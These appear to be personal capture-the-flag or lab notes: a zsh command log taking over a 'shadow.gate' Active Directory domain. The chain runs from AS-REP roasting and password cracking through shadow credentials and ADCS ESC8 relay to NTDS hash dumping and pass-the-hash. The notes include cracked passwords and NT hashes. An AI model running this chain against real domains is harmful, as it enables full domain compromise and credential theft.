```zsh
nxc smb 10.1.126.183
nxc smb 10.1.126.183 --generate-hosts-file hosts
#add to /etc/hosts
nxc smb 10.1.126.183 -u '' -p ''
#no access
nxc ldap 10.1.126.183 -u '' -p '' --users
#nope

rpcclient -U 'shadow.gate/' 10.1.126.183 -N
	enumdomusers
	enumdomgroups
#save users to a users.txt

#Begin asrep-roasting
impacket-GetNPUsers shadow.gate/ -dc-ip 10.1.126.183 -usersfile users.txt -format john -outputfile hashes.txt -no-pass
#gives us the hash for jtrueblood
john hashes.txt -w=/usr/share/wordlists/rockyou.txt
#blood_brothers

impacket-GetUserSPNs -dc-ip 10.1.126.183 shadow.gate/jtrueblood
#no kerberoastable accounts

bloodhound-ce-python -u 'jtrueblood' -p 'blood_brothers' -ns 10.1.126.183 --dns-tcp -d shadow.gate -c All --zip
#load up bloodhound
cd /opt/Bloodhound
BLOODHOUND_PORT=8088 docker compose up

#explore - jtrueblood has an outbound control
#GenericWrite relation on BBrown
#So, we perorm a shadow cred attack

certipy-ad shadow auto -username jtrueblood@shadow.gate -password 'blood_brothers' -account bbrown -dc-ip 10.1.126.183

#Run bloodhound again, for new user. Good measures
bloodhound-ce-python -u 'bbrown' -p '12345678' -ns 10.1.126.183 --dns-tcp -d shadow.gate -c All --zip

#we see bbrown is a member of CERTIFICATE SERVICE DCOM ACCESS@SHADOW.GATE
#Which means, we can look for ADCS vulns using certipy
certipy-ad find -u bbrown -p '12345678' -dc-ip 10.1.126.183 -stdout -vulnerable
#Suggests a ECS8, http-related
#Google, hacktricks article, follow along
#https://github.com/topotam/PetitPotam

impacket-ntlmrelayx  -t http://10.1.126.183/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
#keep it running. it'll wait for any auth coming from dc and capture it and save it
#in a different tab, corerce DC to authenticate (any account works)
nxc smb 10.1.126.183 -u jtrueblood -p 'blood_brothers' --shares
#DC01.shadow.gate.pfx

nxc smb 10.1.126.183 --pfx-cert DC01.shadow.gate.pfx -u 'DC01$'
nxc smb 10.1.126.183 --pfx-cert DC01.shadow.gate.pfx -u 'DC01$' --ntds --user Administrator
#4366ec0f86e29be2a4a5e87a1ba922ec
nxc smb 10.1.126.183 --pfx-cert DC01.shadow.gate.pfx -u 'DC01$' --ntds --user krbtgt
#b5509cbfe52e94940c0ec99b21e09802

#just for fun
evil-winrm -i 10.1.126.183 -u administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec
```